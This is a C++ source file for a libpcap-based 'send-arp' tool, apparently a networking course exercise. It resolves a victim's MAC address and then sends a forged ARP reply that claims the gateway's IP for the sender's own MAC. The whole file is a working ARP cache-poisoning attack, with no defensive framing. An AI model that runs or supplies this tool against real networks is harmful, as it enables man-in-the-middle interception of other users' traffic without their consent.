#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

#define MAC_ALEN 6

#define MAC_ADDR_FMT "%02x:%02x:%02x:%02x:%02x:%02x"
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

int GetMacAddress(const char *ifname, uint8_t *mac_addr){
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("Fail to get interface MAC address - socket() failed - %m\n");
		return -1;
	}

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sockfd);
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
	close(sockfd);

	return 0;
}

void FmtMacAddress(char *fmt_mac_addr,  uint8_t *mac_addr){
	sprintf(fmt_mac_addr,MAC_ADDR_FMT, MAC_ADDR_FMT_ARGS(mac_addr));
}

void GetGatewayIP(const char *ifname, char *gateway_IP){
	FILE *fp = fopen("/proc/net/route", "r");
	if(!fp){
		printf("Fail to open /proc/net/route\n");
		return;
	}
	char line[256];
	
	if(!fgets(line,sizeof(line),fp)){
		printf("Fail to read /proc/net/route\n");
		return;
	}

	while(fgets(line, sizeof(line), fp)){
		char interface[16];
		uint32_t dest,gateway;
		if(sscanf(line, "%s %x %x", interface,&dest,&gateway) == 3){
			if(!strcmp(interface,ifname) && dest == 0){
				struct in_addr addr;
				addr.s_addr = gateway;
				strcpy(gateway_IP,inet_ntoa(addr));
				break;
			}
		}
	}
	fclose(fp);
	printf("gateway_IP: %s\n",gateway_IP);
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	for(int i=2;i<argc;i+=2){
		uint8_t sender_mac_addr[6];
		char fmt_sender_mac_addr[18];
		char fmt_target_mac_addr[18];
		char sender_IP[16];
		char target_IP[16];
		char gateway_IP[16];

		GetMacAddress(dev, sender_mac_addr);
		FmtMacAddress(fmt_sender_mac_addr,sender_mac_addr);
		strcpy(sender_IP,argv[i]);
		strcpy(target_IP,argv[i+1]);
		GetGatewayIP(dev, gateway_IP);

		EthArpPacket packet;

		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(fmt_sender_mac_addr);
		packet.eth_.type_ = htons(EthHdr::Arp);
		
		
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::Size;
		packet.arp_.pln_ = Ip::Size;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(fmt_sender_mac_addr);
		packet.arp_.sip_ = htonl(Ip(sender_IP));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(target_IP));

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			return EXIT_FAILURE;
		}

		while(true){
			struct pcap_pkthdr* header;
			const uint8_t *recv_packet;

			res = pcap_next_ex(pcap, &header, &recv_packet);

			//if(res == 0) continue;
			if(res == -1 || res == -2){
				fprintf(stderr,"pcap_next_ex return %d error=%s\n",res, pcap_geterr(pcap));
				return EXIT_FAILURE;
			}

			EthArpPacket* recv = (EthArpPacket*)recv_packet;

			if(ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
			if(ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;
			if(recv->arp_.sip_ != htonl(Ip(target_IP))) continue;
			if(recv->arp_.tip_ != htonl(Ip(sender_IP))) continue;
			if(recv->arp_.tmac_ != Mac(fmt_sender_mac_addr)) continue;

			strcpy(fmt_target_mac_addr, std::string(recv->arp_.smac_).c_str());
			printf("fmt_target_mac_addr: %s\n",fmt_target_mac_addr);
			break;
		}
		EthArpPacket snf_packet;

		snf_packet.eth_.dmac_ = Mac(fmt_target_mac_addr);
		snf_packet.eth_.smac_ = Mac(fmt_sender_mac_addr);
		snf_packet.eth_.type_ = htons(EthHdr::Arp);

		snf_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		snf_packet.arp_.pro_ = htons(EthHdr::Ip4);
		snf_packet.arp_.hln_ = Mac::Size;
		snf_packet.arp_.pln_ = Ip::Size;
		snf_packet.arp_.op_ = htons(ArpHdr::Reply);
		snf_packet.arp_.smac_ = Mac(fmt_sender_mac_addr);
		snf_packet.arp_.sip_ = htonl(Ip(gateway_IP));
		snf_packet.arp_.tmac_ = Mac(fmt_target_mac_addr);
		snf_packet.arp_.tip_ = htonl(Ip(target_IP));

		res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&snf_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
			return EXIT_FAILURE;
		}
		
	}

	pcap_close(pcap);
}

